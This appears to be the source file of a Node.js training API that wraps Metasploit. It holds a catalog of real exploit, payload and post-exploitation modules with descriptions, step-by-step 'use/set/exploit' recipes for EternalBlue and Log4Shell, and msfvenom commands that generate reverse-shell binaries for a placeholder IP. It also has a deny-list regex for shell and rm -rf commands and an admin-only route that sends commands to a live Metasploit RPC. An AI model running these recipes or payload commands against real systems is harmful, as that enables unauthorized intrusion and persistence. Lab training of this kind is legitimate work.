'use strict';
/**
 * ═══════════════════════════════════════════════════════════════════
 *  FURIOS-INT MSF-SERVICE — server.js
 *  Metasploit Framework companion API for Railway
 *  Connects to Metasploit RPC when configured, simulates when not.
 * ═══════════════════════════════════════════════════════════════════
 */

require('dotenv').config();
const express    = require('express');
const cors       = require('cors');
const rateLimit  = require('express-rate-limit');
const crypto     = require('crypto');

const PORT         = Number(process.env.PORT || 4567);
const ADMIN_KEY    = process.env.ADMIN_KEY || '';
const MSF_RPC_HOST = process.env.MSF_RPC_HOST || 'localhost';
const MSF_RPC_PORT = Number(process.env.MSF_RPC_PORT || 55553);
const MSF_RPC_PASS = process.env.MSF_RPC_PASS || '';
const NEXUS_URL    = process.env.NEXUS_URL || 'https://personfugithubio-production.up.railway.app';

const app = express();
app.use(cors());
app.use(express.json());

const limiter = rateLimit({ windowMs: 60000, max: 60, standardHeaders: true, legacyHeaders: false });
const limiterConsole = rateLimit({ windowMs: 60000, max: 10, standardHeaders: true, legacyHeaders: false });
app.use('/api/', limiter);
app.use('/api/console', limiterConsole);

// ── Admin key guard ────────────────────────────────────────────────────────
function adminGuard(req, res, next) {
  if (!ADMIN_KEY || req.headers['x-admin-key'] !== ADMIN_KEY) return res.status(403).json({ error: 'Forbidden' });
  return next();
}

// ── Input sanitizers ──────────────────────────────────────────────────────
const CMD_DENY = /shell|exec|system\s*\(|rm\s+-rf|del\s+\/|format\s+[a-z]:|;\s*\S|&&|\|\||`|eval\s*\(/i;

// ══════════════════════════════════════════════
// Module Catalog
// ══════════════════════════════════════════════
const MODULES = [
  // ── Auxiliary / Scanners ────────────────────
  { type:'auxiliary', cat:'scanner', rank:'normal', name:'auxiliary/scanner/portscan/tcp',            desc:'TCP port scanner. Scans configurable port ranges across host networks.',                                                cve:null,            refs:['https://www.rapid7.com/db/modules/auxiliary/scanner/portscan/tcp/'] },
  { type:'auxiliary', cat:'scanner', rank:'normal', name:'auxiliary/scanner/portscan/syn',            desc:'SYN (stealth) port scanner. Faster than TCP, requires root/admin.',                                                   cve:null,            refs:[] },
  { type:'auxiliary', cat:'scanner', rank:'normal', name:'auxiliary/scanner/smb/smb_ms17_010',        desc:'Detects EternalBlue (MS17-010) SMBv1 RCE vulnerability across host ranges.',                                         cve:'CVE-2017-0144', refs:['https://docs.rapid7.com/metasploit/ms17-010-eternalblue/'] },
  { type:'auxiliary', cat:'scanner', rank:'normal', name:'auxiliary/scanner/smb/smb_version',         desc:'Fingerprint SMB version on remote hosts. Identifies SMBv1 exposure.',                                                  cve:null,            refs:[] },
  { type:'auxiliary', cat:'scanner', rank:'normal', name:'auxiliary/scanner/http/dir_scanner',        desc:'HTTP directory brute-force using wordlist. Discovers hidden web paths and admin panels.',                              cve:null,            refs:[] },
  { type:'auxiliary', cat:'scanner', rank:'normal', name:'auxiliary/scanner/http/http_version',       desc:'HTTP server version banner grabbing. Identifies web server software.',                                                  cve:null,            refs:[] },
  { type:'auxiliary', cat:'scanner', rank:'normal', name:'auxiliary/scanner/http/robots_txt',         desc:'Fetches robots.txt from HTTP/HTTPS servers. Discovers hidden paths.',                                                   cve:null,            refs:[] },
  { type:'auxiliary', cat:'scanner', rank:'normal', name:'auxiliary/scanner/ssh/ssh_version',         desc:'SSH version fingerprinting across subnets. Identifies outdated OpenSSH versions.',                                      cve:null,            refs:[] },
  { type:'auxiliary', cat:'scanner', rank:'normal', name:'auxiliary/scanner/ssh/ssh_login',           desc:'SSH credential brute-force. Tests username/password combos against SSH targets.',                                      cve:null,            refs:[] },
  { type:'auxiliary', cat:'scanner', rank:'normal', name:'auxiliary/scanner/ftp/ftp_version',         desc:'FTP version fingerprinting and anonymous login detection.',                                                             cve:null,            refs:[] },
  { type:'auxiliary', cat:'scanner', rank:'normal', name:'auxiliary/scanner/rdp/rdp_scanner',         desc:'Detects open RDP services. Fingerprints OS and checks BlueKeep exposure.',                                             cve:'CVE-2019-0708', refs:[] },
  { type:'auxiliary', cat:'gather',  rank:'normal', name:'auxiliary/gather/dns_enum',                 desc:'DNS zone enumeration. Discovers subdomains, MX, NS, PTR records via brute-force and transfers.',                      cve:null,            refs:[] },
  { type:'auxiliary', cat:'gather',  rank:'normal', name:'auxiliary/gather/dns_bruteforce',           desc:'DNS subdomain brute-force using configurable wordlists.',                                                               cve:null,            refs:[] },
  { type:'auxiliary', cat:'gather',  rank:'normal', name:'auxiliary/gather/shodan_search',            desc:'Queries Shodan API for hosts matching a given query. Requires SHODAN_APIKEY.',                                         cve:null,            refs:['https://www.shodan.io'] },
  { type:'auxiliary', cat:'spoof',   rank:'normal', name:'auxiliary/spoof/arp/arp_poisoning',         desc:'ARP cache poisoning for MITM on LAN segments. Intercepts traffic between targets.',                                    cve:null,            refs:[] },
  { type:'auxiliary', cat:'dos',     rank:'normal', name:'auxiliary/dos/tcp/synflood',                desc:'TCP SYN flood DoS. Educational demonstration of SYN flood attacks.',                                                    cve:null,            refs:[] },

  // ── Exploits ────────────────────────────────
  { type:'exploit', cat:'remote', rank:'great',    name:'exploit/multi/handler',                      desc:'Universal reverse/bind shell payload catcher. Core tool for all staged payloads.',                                     cve:null,            refs:[] },
  { type:'exploit', cat:'remote', rank:'great',    name:'exploit/windows/smb/ms17_010_eternalblue',   desc:'EternalBlue SMBv1 RCE. Exploits CVE-2017-0144. Win7/2008R2. CVSS 9.3 Critical. NSA leak.',                            cve:'CVE-2017-0144', refs:['https://nvd.nist.gov/vuln/detail/CVE-2017-0144','https://docs.rapid7.com/metasploit/ms17-010-eternalblue/'] },
  { type:'exploit', cat:'remote', rank:'great',    name:'exploit/windows/smb/ms17_010_psexec',        desc:'EternalBlue + psexec for reliable code execution. More stable than raw shellcode.',                                    cve:'CVE-2017-0144', refs:[] },
  { type:'exploit', cat:'remote', rank:'great',    name:'exploit/windows/smb/ms08_067_netapi',        desc:'MS08-067 NetAPI Server Service RCE. Windows XP/2003 classic — CVSS 10.0.',                                            cve:'CVE-2008-4250', refs:[] },
  { type:'exploit', cat:'remote', rank:'excellent', name:'exploit/multi/http/apache_mod_cgi_bash_env', desc:'Shellshock CGI bash env injection RCE. CVE-2014-6271. Remote code via HTTP headers.',                                  cve:'CVE-2014-6271', refs:['https://nvd.nist.gov/vuln/detail/CVE-2014-6271'] },
  { type:'exploit', cat:'remote', rank:'excellent', name:'exploit/unix/ftp/vsftpd_234_backdoor',       desc:'vsFTPd 2.3.4 smiley-face trojan backdoor. Spawns shell on port 6200.',                                                cve:'CVE-2011-2523', refs:[] },
  { type:'exploit', cat:'remote', rank:'excellent', name:'exploit/multi/http/struts2_content_type_ognl','desc':'Apache Struts2 OGNL injection RCE (Equifax breach vector). CVSS 10.0.',                                            cve:'CVE-2017-5638', refs:['https://nvd.nist.gov/vuln/detail/CVE-2017-5638'] },
  { type:'exploit', cat:'remote', rank:'excellent', name:'exploit/multi/http/log4shell_header',        desc:'Log4Shell JNDI injection via HTTP headers. CVSS 10.0 — most critical 2021 vuln.',                                    cve:'CVE-2021-44228', refs:['https://nvd.nist.gov/vuln/detail/CVE-2021-44228'] },
  { type:'exploit', cat:'remote', rank:'excellent', name:'exploit/multi/http/spring4shell',            desc:'Spring Framework ClassLoader RCE via HTTP binding. CVSS 9.8 Critical.',                                               cve:'CVE-2022-22965', refs:['https://nvd.nist.gov/vuln/detail/CVE-2022-22965'] },
  { type:'exploit', cat:'remote', rank:'great',    name:'exploit/multi/misc/print_spooler_rce_cve_2021_34527', desc:'PrintNightmare Windows Print Spooler RCE/LPE. CVSS 8.8.',                                                 cve:'CVE-2021-34527', refs:[] },
  { type:'exploit', cat:'remote', rank:'excellent', name:'exploit/linux/http/f5_bigip_icontrol_rce',   desc:'F5 BIG-IP iControl REST API auth bypass + RCE. CVSS 9.8 Critical.',                                                 cve:'CVE-2022-1388',  refs:[] },
  { type:'exploit', cat:'remote', rank:'excellent', name:'exploit/multi/http/citrix_dir_traversal_rce','desc':'Citrix ADC/Gateway directory traversal leading to RCE. CVE-2019-19781.',                                            cve:'CVE-2019-19781', refs:[] },
  { type:'exploit', cat:'local',  rank:'excellent', name:'exploit/linux/local/sudo_baron_samedit',     desc:'Sudo heap overflow LPE to root. Baron Samedit — affects sudo < 1.9.5p2.',                                            cve:'CVE-2021-3156',  refs:['https://nvd.nist.gov/vuln/detail/CVE-2021-3156'] },
  { type:'exploit', cat:'local',  rank:'excellent', name:'exploit/linux/local/pkexec_lpe',             desc:'PwnKit — pkexec SUID LPE. Polkit < 0.120. 12-year vulnerability.',                                                   cve:'CVE-2021-4034',  refs:[] },
  { type:'exploit', cat:'local',  rank:'great',    name:'exploit/linux/local/cve_2022_0847_dirtypipe', desc:'DirtyPipe Linux kernel LPE. Arbitrary write via pipe splice. Kernel 5.8–5.16.',                                      cve:'CVE-2022-0847',  refs:[] },
  { type:'exploit', cat:'webapps', rank:'excellent', name:'exploit/multi/http/wp_admin_shell_upload',  desc:'WordPress authenticated admin plugin shell upload. Classic web shell delivery.',                                       cve:null,             refs:[] },
  { type:'exploit', cat:'webapps', rank:'excellent', name:'exploit/multi/http/drupal_drupalgeddon2',   desc:'Drupalgeddon2 — Drupal < 7.58/8.3.9 RCE via form API cache poisoning.',                                             cve:'CVE-2018-7600',  refs:[] },

  // ── Payloads ────────────────────────────────
  { type:'payload', cat:'reverse', rank:'normal',   name:'payload/linux/x64/meterpreter/reverse_tcp',    desc:'Linux x64 staged Meterpreter reverse TCP shell. Full-featured post-ex.',                  cve:null, refs:[] },
  { type:'payload', cat:'reverse', rank:'normal',   name:'payload/linux/x64/shell/reverse_tcp',          desc:'Linux x64 staged raw shell reverse TCP.',                                                  cve:null, refs:[] },
  { type:'payload', cat:'reverse', rank:'normal',   name:'payload/windows/x64/meterpreter/reverse_https','desc':'Windows x64 staged Meterpreter reverse HTTPS. Encrypted C2 channel.',                   cve:null, refs:[] },
  { type:'payload', cat:'reverse', rank:'normal',   name:'payload/windows/x64/meterpreter/reverse_tcp',  desc:'Windows x64 staged Meterpreter reverse TCP.',                                              cve:null, refs:[] },
  { type:'payload', cat:'reverse', rank:'normal',   name:'payload/osx/x64/meterpreter/reverse_tcp',      desc:'macOS x64 Meterpreter reverse TCP shell.',                                                 cve:null, refs:[] },
  { type:'payload', cat:'bind',    rank:'normal',   name:'payload/cmd/unix/bind_bash',                   desc:'Bind shell via /bin/bash on specified port.',                                               cve:null, refs:[] },
  { type:'payload', cat:'single',  rank:'normal',   name:'payload/cmd/unix/reverse_python',              desc:'Python-based single-stage reverse shell. Good fallback when no binary injection.',         cve:null, refs:[] },

  // ── Post-Exploitation ────────────────────────
  { type:'post', cat:'gather',    rank:'normal',    name:'post/multi/gather/env',                         desc:'Enumerate environment variables from Meterpreter session.',                                 cve:null, refs:[] },
  { type:'post', cat:'gather',    rank:'normal',    name:'post/linux/gather/hashdump',                    desc:'Dump /etc/shadow hashes from compromised Linux hosts.',                                    cve:null, refs:[] },
  { type:'post', cat:'gather',    rank:'normal',    name:'post/linux/gather/enum_network',                desc:'Enumerate network config, routes, ARP table, and open sockets.',                           cve:null, refs:[] },
  { type:'post', cat:'gather',    rank:'normal',    name:'post/linux/gather/enum_configs',                desc:'Collect configuration files: SSH keys, cron jobs, .bash_history, sudoers.',               cve:null, refs:[] },
  { type:'post', cat:'gather',    rank:'normal',    name:'post/windows/gather/credentials/credential_collector', desc:'Collect Windows credential artifacts from LSASS, SAM, registry, etc.',            cve:null, refs:[] },
  { type:'post', cat:'gather',    rank:'normal',    name:'post/windows/gather/enum_domain',               desc:'Enumerate Windows domain info: DC, users, groups, GPOs.',                                 cve:null, refs:[] },
  { type:'post', cat:'escalate',  rank:'normal',    name:'post/multi/manage/shell_to_meterpreter',        desc:'Upgrade a basic shell to a full Meterpreter session.',                                    cve:null, refs:[] },
  { type:'post', cat:'persist',   rank:'normal',    name:'post/windows/manage/persistence',               desc:'Install persistent backdoor via Windows registry run key.',                               cve:null, refs:[] },
  { type:'post', cat:'persist',   rank:'normal',    name:'post/linux/manage/cron_persistence',            desc:'Install cron-based persistence on compromised Linux hosts.',                               cve:null, refs:[] },
  { type:'post', cat:'lateral',   rank:'normal',    name:'post/multi/manage/invoke_ps_commands',          desc:'Run PowerShell commands on remote Windows Meterpreter sessions.',                         cve:null, refs:[] },
  { type:'post', cat:'lateral',   rank:'normal',    name:'post/windows/manage/migrate',                   desc:'Migrate Meterpreter to another process for stability and OPSEC.',                        cve:null, refs:[] }
];

// CVE → module map
const CVE_MAP = {};
for (const m of MODULES) {
  if (m.cve) {
    CVE_MAP[m.cve] = CVE_MAP[m.cve] || [];
    CVE_MAP[m.cve].push(m.name);
  }
}

// ══════════════════════════════════════════════
// Metasploit RPC (msgpack HTTP) — optional live
// ══════════════════════════════════════════════
let msfToken = null;
const MSF_BASE = `http://${MSF_RPC_HOST}:${MSF_RPC_PORT}`;

async function msfRpcCall(method, params = []) {
  if (!MSF_RPC_PASS) return null;
  try {
    // Metasploit RPC uses JSON-RPC over HTTP on modern versions
    const r = await fetch(`${MSF_BASE}/api/v1/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...(msfToken ? { 'Authorization': `Bearer ${msfToken}` } : {}) },
      body: JSON.stringify(params[0] || {}),
      signal: AbortSignal.timeout(6000)
    });
    if (!r.ok) return null;
    return await r.json();
  } catch (_) { return null; }
}

async function msfLogin() {
  if (!MSF_RPC_PASS) return false;
  try {
    const r = await fetch(`${MSF_BASE}/api/v1/auth/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ username: 'msf', password: MSF_RPC_PASS }),
      signal: AbortSignal.timeout(5000)
    });
    if (!r.ok) return false;
    const d = await r.json();
    msfToken = d.token || null;
    if (msfToken) console.log('[MSF] RPC authenticated via Metasploit API');
    return !!msfToken;
  } catch (e) { console.warn('[MSF] RPC login failed:', e.message); return false; }
}

// ══════════════════════════════════════════════
// Console simulation
// ══════════════════════════════════════════════
const CONSOLE_SIM = {
  'help':            `Core Commands:\n  help       — Help menu\n  use <mod>  — Select a module\n  search <q> — Search modules\n  show       — Show exploits/payloads/options\n  set <k> <v>— Set option\n  run/exploit — Execute module\n  sessions   — Manage sessions\n  back       — Deselect module\n  exit       — Quit\n`,
  'version':         `Framework: 6.4.0  Ruby: 3.2.2  OpenSSL: 3.1.4  Build: FURIOS-TRAINING\n`,
  'sessions':        `Active sessions: 0  — Run an exploit to create sessions.\n`,
  'jobs':            `No active background jobs.\n`,
  'show exploits':   MODULES.filter(m=>m.type==='exploit').slice(0,20).map(m=>`  ${m.name}  [${m.rank}]`).join('\n')+'\n',
  'show auxiliary':  MODULES.filter(m=>m.type==='auxiliary').slice(0,20).map(m=>`  ${m.name}  [${m.rank}]`).join('\n')+'\n',
  'show payloads':   MODULES.filter(m=>m.type==='payload').slice(0,15).map(m=>`  ${m.name}`).join('\n')+'\n',
  'search eternalblue': `  exploit/windows/smb/ms17_010_eternalblue  [EternalBlue — CVE-2017-0144 CRITICAL]\n  auxiliary/scanner/smb/smb_ms17_010        [Detector]\n`,
  'search log4':     `  exploit/multi/http/log4shell_header        [Log4Shell — CVE-2021-44228 CRITICAL]\n`,
  'search struts':   `  exploit/multi/http/struts2_content_type_ognl  [CVE-2017-5638 CRITICAL]\n`,
  'search sudo':     `  exploit/linux/local/sudo_baron_samedit     [Baron Samedit — CVE-2021-3156 HIGH]\n`,
  'search spring':   `  exploit/multi/http/spring4shell             [Spring4Shell — CVE-2022-22965 CRITICAL]\n`,
  'search dirty':    `  exploit/linux/local/cve_2022_0847_dirtypipe [DirtyPipe — CVE-2022-0847 HIGH]\n`
};

function simulateConsole(cmd) {
  const c = cmd.trim().toLowerCase();
  const key = Object.keys(CONSOLE_SIM).find(k => c.startsWith(k));
  if (key) return { output: `msf6 > ${cmd}\n${CONSOLE_SIM[key]}`, mode: 'simulation' };

  if (/^use\s+/.test(c)) {
    const name = cmd.slice(4).trim();
    const mod = MODULES.find(m => m.name === name);
    if (mod) return { output: `msf6 > ${cmd}\n[*] Using module: ${mod.name}\n[i] ${mod.desc}\nmsf6 ${mod.type}(${name.split('/').pop()}) > \n`, mode: 'simulation' };
    return { output: `msf6 > ${cmd}\n[-] Module not found: ${name}\n`, mode: 'simulation' };
  }
  if (/^search\s+/.test(c)) {
    const q = c.slice(7).trim();
    const found = MODULES.filter(m => m.name.includes(q) || m.desc.toLowerCase().includes(q));
    if (!found.length) return { output: `msf6 > ${cmd}\n[*] No matching modules.\n`, mode: 'simulation' };
    return { output: `msf6 > ${cmd}\n${found.map(m=>`  ${m.name}  [${m.cat}]  ${m.cve||''}`).join('\n')}\n`, mode: 'simulation' };
  }
  return { output: `msf6 > ${cmd}\n[i] Training mode — type 'help' or 'show exploits'\n`, mode: 'simulation' };
}

// ══════════════════════════════════════════════
// Routes
// ══════════════════════════════════════════════

app.get('/health', (_req, res) => {
  res.json({
    ok: true, service: 'furios-msf-service', version: '1.0.0',
    modules: MODULES.length, msfRpc: msfToken ? 'live' : 'simulation',
    uptime: Math.floor(process.uptime()), timestamp: new Date().toISOString()
  });
});

// GET /api/modules?q=blue&type=exploit&cat=remote&rank=excellent
app.get('/api/modules', (req, res) => {
  const q    = String(req.query.q    || '').slice(0, 80).toLowerCase();
  const type = String(req.query.type || '');
  const cat  = String(req.query.cat  || '');
  const rank = String(req.query.rank || '');

  let mods = MODULES;
  if (q)    mods = mods.filter(m => m.name.includes(q) || m.desc.toLowerCase().includes(q) || (m.cve||'').includes(q));
  if (type) mods = mods.filter(m => m.type === type);
  if (cat)  mods = mods.filter(m => m.cat  === cat);
  if (rank) mods = mods.filter(m => m.rank === rank);

  return res.json({
    total: mods.length, modules: mods,
    meta: { types: [...new Set(MODULES.map(m=>m.type))], cats: [...new Set(MODULES.map(m=>m.cat))], ranks: [...new Set(MODULES.map(m=>m.rank))] }
  });
});

// GET /api/modules/:type
app.get('/api/modules/:type', (req, res) => {
  const type = req.params.type;
  const mods = MODULES.filter(m => m.type === type);
  if (!mods.length) return res.status(404).json({ error: `No modules of type: ${type}` });
  return res.json({ type, total: mods.length, modules: mods });
});

// GET /api/module?name=exploit/...
app.get('/api/module', (req, res) => {
  const name = String(req.query.name || '').slice(0, 150);
  if (!name) return res.status(400).json({ error: 'name required' });
  const mod = MODULES.find(m => m.name === name);
  if (!mod) return res.status(404).json({ error: 'Module not found' });

  const USAGE = {
    'exploit/windows/smb/ms17_010_eternalblue': {
      options: { RHOSTS: '<target IP>', LHOST: '<your IP>', PAYLOAD: 'windows/x64/meterpreter/reverse_tcp' },
      cmd: `use exploit/windows/smb/ms17_010_eternalblue\nset RHOSTS <target>\nset LHOST <your-ip>\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit`,
      lab: 'HackTheBox: Blue, THM: EternalBlue, PG: WinXP-samba'
    },
    'exploit/multi/http/log4shell_header': {
      options: { RHOSTS: '<target>', LHOST: '<your IP>', RPORT: '8080' },
      cmd: `use exploit/multi/http/log4shell_header\nset RHOSTS <target>\nset LHOST <your-ip>\nexploit`,
      lab: 'THM: Solar, HTB: Logforge'
    },
    'auxiliary/scanner/portscan/tcp': {
      options: { RHOSTS: '<range>', PORTS: '22,80,443,445,3389,8080' },
      cmd: `use auxiliary/scanner/portscan/tcp\nset RHOSTS 10.10.10.0/24\nset PORTS 22,80,443,445,3389\nrun`,
      lab: 'Any network recon lab'
    },
    'exploit/linux/local/sudo_baron_samedit': {
      options: { SESSION: '<meterpreter session id>' },
      cmd: `use exploit/linux/local/sudo_baron_samedit\nset SESSION 1\nrun`,
      lab: 'THM: Baron Samedit, HTB: Academy'
    }
  };
  return res.json({ ...mod, usage: USAGE[name] || { cmd: `use ${name}\nshow options\nexploit`, lab: 'Configure required options' } });
});

// GET /api/cve-map?cve=CVE-2017-0144
app.get('/api/cve-map', (req, res) => {
  const cve = String(req.query.cve || '').toUpperCase().slice(0, 30);
  if (!cve) return res.json({ cvemap: CVE_MAP, count: Object.keys(CVE_MAP).length });
  const modules = CVE_MAP[cve];
  if (!modules) return res.status(404).json({ error: `No modules mapped to ${cve}`, allCves: Object.keys(CVE_MAP) });
  const enriched = modules.map(name => MODULES.find(m => m.name === name)).filter(Boolean);
  return res.json({ cve, modules: enriched, count: enriched.length });
});

// GET /api/ttps — MITRE ATT&CK reference with MSF module links
app.get('/api/ttps', (req, res) => {
  return res.json({
    source: 'MITRE ATT&CK + Metasploit mapping',
    techniques: [
      { id:'T1190', name:'Exploit Public-Facing Application',    tactic:'initial-access',      modules:['exploit/multi/http/log4shell_header','exploit/multi/http/struts2_content_type_ognl','exploit/multi/http/apache_mod_cgi_bash_env'] },
      { id:'T1110', name:'Brute Force',                          tactic:'credential-access',   modules:['auxiliary/scanner/ssh/ssh_login'] },
      { id:'T1046', name:'Network Service Scanning',             tactic:'discovery',           modules:['auxiliary/scanner/portscan/tcp','auxiliary/scanner/portscan/syn','auxiliary/scanner/smb/smb_version'] },
      { id:'T1059', name:'Command and Scripting Interpreter',    tactic:'execution',           modules:['payload/cmd/unix/reverse_python','payload/cmd/unix/bind_bash'] },
      { id:'T1055', name:'Process Injection',                    tactic:'privilege-escalation',modules:['post/windows/manage/migrate'] },
      { id:'T1068', name:'Exploitation for Privilege Escalation',tactic:'privilege-escalation',modules:['exploit/linux/local/sudo_baron_samedit','exploit/linux/local/pkexec_lpe','exploit/linux/local/cve_2022_0847_dirtypipe'] },
      { id:'T1003', name:'OS Credential Dumping',                tactic:'credential-access',   modules:['post/linux/gather/hashdump','post/windows/gather/credentials/credential_collector'] },
      { id:'T1021', name:'Remote Services',                      tactic:'lateral-movement',    modules:['exploit/windows/smb/ms17_010_psexec'] },
      { id:'T1018', name:'Remote System Discovery',              tactic:'discovery',           modules:['auxiliary/gather/dns_enum','auxiliary/gather/dns_bruteforce'] },
      { id:'T1547', name:'Boot or Logon Autostart Execution',    tactic:'persistence',         modules:['post/windows/manage/persistence','post/linux/manage/cron_persistence'] },
      { id:'T1071', name:'Application Layer Protocol (C2)',      tactic:'command-and-control', modules:['payload/linux/x64/meterpreter/reverse_tcp','payload/windows/x64/meterpreter/reverse_https'] }
    ]
  });
});

// GET /api/payloads — payload generator reference
app.get('/api/payloads', (req, res) => {
  const OS = String(req.query.os || '').toLowerCase();
  const TYPE = String(req.query.type || '').toLowerCase();
  const all = [
    { os:'linux',   arch:'x64',   type:'meterpreter', staged:true,  name:'payload/linux/x64/meterpreter/reverse_tcp',       msfvenom:`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf` },
    { os:'linux',   arch:'x64',   type:'shell',        staged:false, name:'payload/linux/x64/shell_reverse_tcp',             msfvenom:`msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf` },
    { os:'windows', arch:'x64',   type:'meterpreter', staged:true,  name:'payload/windows/x64/meterpreter/reverse_tcp',     msfvenom:`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe` },
    { os:'windows', arch:'x64',   type:'meterpreter', staged:true,  name:'payload/windows/x64/meterpreter/reverse_https',   msfvenom:`msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f exe -o shell.exe` },
    { os:'windows', arch:'x86',   type:'meterpreter', staged:true,  name:'payload/windows/meterpreter/reverse_tcp',         msfvenom:`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe` },
    { os:'osx',     arch:'x64',   type:'meterpreter', staged:true,  name:'payload/osx/x64/meterpreter/reverse_tcp',         msfvenom:`msfvenom -p osx/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f macho -o shell` },
    { os:'web',     arch:'any',   type:'php',          staged:false, name:'payload/php/meterpreter/reverse_tcp',             msfvenom:`msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f raw -o shell.php` },
    { os:'web',     arch:'any',   type:'aspx',         staged:false, name:'payload/windows/meterpreter/reverse_tcp',         msfvenom:`msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -f aspx -o shell.aspx` },
    { os:'android', arch:'arm',   type:'meterpreter', staged:true,  name:'payload/android/meterpreter/reverse_tcp',         msfvenom:`msfvenom -p android/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 R > shell.apk` },
    { os:'any',     arch:'any',   type:'bash',         staged:false, name:'payload/cmd/unix/reverse_bash',                   msfvenom:`msfvenom -p cmd/unix/reverse_bash LHOST=<IP> LPORT=4444 -f raw` }
  ];
  let filtered = all;
  if (OS)   filtered = filtered.filter(p => p.os === OS || p.os === 'any');
  if (TYPE) filtered = filtered.filter(p => p.type === TYPE);
  return res.json({ payloads: filtered, total: filtered.length, nexusUrl: `${NEXUS_URL}/api/tools/msf/search?type=payload` });
});

// GET /api/scan/sim?targets=10.10.10.10&ports=22,80,443
app.get('/api/scan/sim', (req, res) => {
  const target = String(req.query.target || '192.168.1.1');
  const ports  = String(req.query.ports  || '22,80,443,445,3389,8080').split(',').map(Number).filter(p => p > 0 && p < 65536).slice(0, 20);
  const COMMON = {
    22:   { service:'ssh',      banner:'OpenSSH 8.9p1 Ubuntu-3ubuntu0.7' },
    80:   { service:'http',     banner:'Apache httpd 2.4.41' },
    443:  { service:'https',    banner:'nginx/1.18.0' },
    445:  { service:'microsoft-ds', banner:'Windows SMB' },
    3389: { service:'rdp',      banner:'Microsoft Terminal Services' },
    3306: { service:'mysql',    banner:'MySQL 8.0.36' },
    5432: { service:'postgres', banner:'PostgreSQL 16.1' },
    6379: { service:'redis',    banner:'Redis 7.2.4' },
    8080: { service:'http-alt', banner:'Jetty 9.4.51' },
    8443: { service:'https-alt',banner:'Apache Tomcat 9.0.85' },
    21:   { service:'ftp',      banner:'vsftpd 3.0.5' },
    25:   { service:'smtp',     banner:'Postfix smtpd' }
  };
  const openPorts = ports.filter(() => Math.random() > 0.4);
  const results = openPorts.map(p => ({
    port: p, state: 'open', protocol: 'tcp',
    service: (COMMON[p] && COMMON[p].service) || 'unknown',
    version: (COMMON[p] && COMMON[p].banner)  || 'unknown'
  }));
  return res.json({
    target, scanned: ports.length, open: results.length,
    results, note: 'Simulated scan — educational use only',
    nexusCmd: `use auxiliary/scanner/portscan/tcp\nset RHOSTS ${target}\nset PORTS ${ports.join(',')}\nrun`
  });
});

// POST /api/console — live or simulation
app.post('/api/console', async (req, res) => {
  const cmd = String((req.body || {}).command || '').slice(0, 200).trim();
  if (!cmd) return res.status(400).json({ error: 'command required' });
  if (CMD_DENY.test(cmd)) return res.status(400).json({ error: 'Command not permitted in training mode.' });

  // Try live RPC first
  if (msfToken) {
    const live = await msfRpcCall('consoles', [{ command: cmd }]);
    if (live) return res.json({ ...live, mode: 'live' });
  }

  return res.json(simulateConsole(cmd));
});

// POST /api/console/live — admin-only live RPC passthrough
app.post('/api/console/live', adminGuard, async (req, res) => {
  const cmd = String((req.body || {}).command || '').slice(0, 500).trim();
  if (!cmd) return res.status(400).json({ error: 'command required' });
  if (!msfToken) return res.status(503).json({ error: 'Live MSF RPC not connected', simulation: simulateConsole(cmd) });
  const live = await msfRpcCall('consoles', [{ command: cmd }]);
  return live ? res.json({ ...live, mode: 'live' }) : res.status(502).json({ error: 'MSF RPC call failed' });
});

// ── Startup ────────────────────────────────────────────────────────────────
(async () => {
  if (MSF_RPC_PASS) {
    await msfLogin();
    setInterval(msfLogin, 25 * 60 * 1000);
  }
  app.listen(PORT, '0.0.0.0', () => {
    console.log(`[MSF-SERVICE] Listening on 0.0.0.0:${PORT}`);
    console.log(`[MSF-SERVICE] Modules: ${MODULES.length} | CVE mappings: ${Object.keys(CVE_MAP).length}`);
    console.log(`[MSF-SERVICE] RPC: ${MSF_RPC_PASS ? `${MSF_BASE}` : 'simulation mode (set MSF_RPC_PASS)'}`);
    console.log(`[MSF-SERVICE] Nexus: ${NEXUS_URL}`);
  });
})();
